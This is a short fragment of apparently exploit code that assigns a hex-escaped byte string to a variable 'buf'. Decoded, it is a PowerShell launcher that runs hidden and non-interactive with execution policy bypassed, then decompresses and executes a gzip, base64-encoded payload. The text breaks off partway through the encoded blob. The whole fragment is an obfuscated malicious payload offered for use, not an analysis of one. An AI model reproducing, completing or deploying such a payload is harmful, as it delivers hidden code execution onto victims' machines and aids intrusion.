buf = 
"\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x2e\x65\x78\x65" +
"\x20\x2d\x6e\x6f\x70\x20\x2d\x77\x20\x68\x69\x64\x64\x65" +
"\x6e\x20\x2d\x6e\x6f\x6e\x69\x20\x2d\x65\x70\x20\x62\x79" +
"\x70\x61\x73\x73\x20\x22\x26\x28\x5b\x73\x63\x72\x69\x70" +
"\x74\x62\x6c\x6f\x63\x6b\x5d\x3a\x3a\x63\x72\x65\x61\x74" +
"\x65\x28\x28\x4e\x65\x77\x2d\x4f\x62\x6a\x65\x63\x74\x20" +
"\x53\x79\x73\x74\x65\x6d\x2e\x49\x4f\x2e\x53\x74\x72\x65" +
"\x61\x6d\x52\x65\x61\x64\x65\x72\x28\x4e\x65\x77\x2d\x4f" +
"\x62\x6a\x65\x63\x74\x20\x53\x79\x73\x74\x65\x6d\x2e\x49" +
"\x4f\x2e\x43\x6f\x6d\x70\x72\x65\x73\x73\x69\x6f\x6e\x2e" +
"\x47\x7a\x69\x70\x53\x74\x72\x65\x61\x6d\x28\x28\x4e\x65" +
"\x77\x2d\x4f\x62\x6a\x65\x63\x74\x20\x53\x79\x73\x74\x65" +
"\x6d\x2e\x49\x4f\x2e\x4d\x65\x6d\x6f\x72\x79\x53\x74\x72" +
"\x65\x61\x6d\x28\x2c\x5b\x53\x79\x73\x74\x65\x6d\x2e\x43" +
"\x6f\x6e\x76\x65\x72\x74\x5d\x3a\x3a\x46\x72\x6f\x6d\x42" +
"\x61\x73\x65\x36\x34\x53\x74\x72\x69\x6e\x67\x28\x27\x48" +
"\x34\x73\x49\x41\x45\x52\x45\x4c\x56\x34\x43\x41\x35\x31" +
"\x57\x32\x32\x37\x62\x4f\x42\x42\x39\x39\x31\x63\x4d\x58" +
"\x47\x30\x74\x49\x52\x59\x68\x47\x32\x69\x52\x44\x5a\x43" +
"\x69\x72\x70\x4b\x32\x41\x62\x4b\x74\x55\x58\x6b\x33\x44" +
"\x34\x61\x42\x30\x4e\x49\x34\x31\x6b\x59\x6d\x58\x5a\x4c" +
"\x79\x42\x59\x6e\x2f\x66\x55\x6d\x4a\x73\x75\x51\x34\x51" +
"\x54\x66\x56\x69\x79\x31\x79\x35\x73\x7a\x68\x6d\x51\x76" +
"\x31\x42\x6f\x5a\x38\x6a\x57\x4b\x57\x4d\x2f\x44\x68\x52" +
"\x71\x52\x4b\x49\x59\x50\x70\x46\x6a\x37\x70\x6e\x31\x45" +
